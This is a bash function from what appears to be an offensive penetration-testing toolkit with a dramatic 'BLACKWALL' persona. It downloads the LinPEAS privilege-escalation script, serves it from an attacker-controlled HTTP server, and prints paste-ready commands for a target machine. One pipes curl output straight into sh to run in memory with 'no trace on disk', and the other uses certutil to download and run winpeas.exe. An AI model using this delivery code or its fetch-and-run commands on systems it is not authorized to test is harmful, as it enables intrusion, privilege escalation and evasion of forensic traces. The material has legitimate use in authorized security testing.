#!/bin/bash

run_peas_delivery() {
    if [ -z "${STATE[lhost]}" ]; then
        configure_network_parameters
    fi

    local lhost="${STATE[lhost]}"
    local lport="8000"
    local peas_dir="${BASE_DIR}/core/peas"

    mkdir -p "$peas_dir" 2>/dev/null

    if [ ! -f "${peas_dir}/linpeas.sh" ]; then
        echo -e "${TXT_DRK_RED}[ ~ ] LinPEAS missing. Downloading from Github...${NC}"
        curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" -o "${peas_dir}/linpeas.sh"
    fi

    python3 -m http.server "$lport" --directory "$peas_dir" > /dev/null 2>&1 &
    local server_pid=$!

    STATE[web_server_pid]="$server_pid"

    echo -e "${TXT_DRK_RED}============================================================${NC}"
    echo -e "${TXT_PULSE_RED}[///] EFUSE KERNEL MEMORY ACTIVE: LOCAL PEAS SERVER ONLINE${NC}"
    echo -e "${TXT_DRK_RED}============================================================${NC}\n"

    ai_speak "Deliver the simulacrum. Let them analyze their own ruin."

    echo -e "\n${TXT_MID_RED}[ Linux PrivEsc - Execute directly in memory (No trace on disk): ]${NC}"
    echo -e "${TXT_CORE}curl -s http://${lhost}:${lport}/linpeas.sh | sh${NC}"

    echo -e "\n${TXT_MID_RED}[ Windows PrivEsc - Download and Execute: ]${NC}"
    echo -e "${TXT_CORE}certutil -urlcache -f http://${lhost}:${lport}/winpeas.exe winpeas.exe && winpeas.exe${NC}"

    echo -e "\n${TXT_DRK_RED}------------------------------------------------------------${NC}"
    echo -e "${TXT_SCARLET}[!] Press Enter to terminate local BLACKWALL delivery server...${NC}"
    echo -e "${TXT_DRK_RED}------------------------------------------------------------${NC}"
    read -r

    kill "$server_pid" 2>/dev/null
    wait "$server_pid" 2>/dev/null
}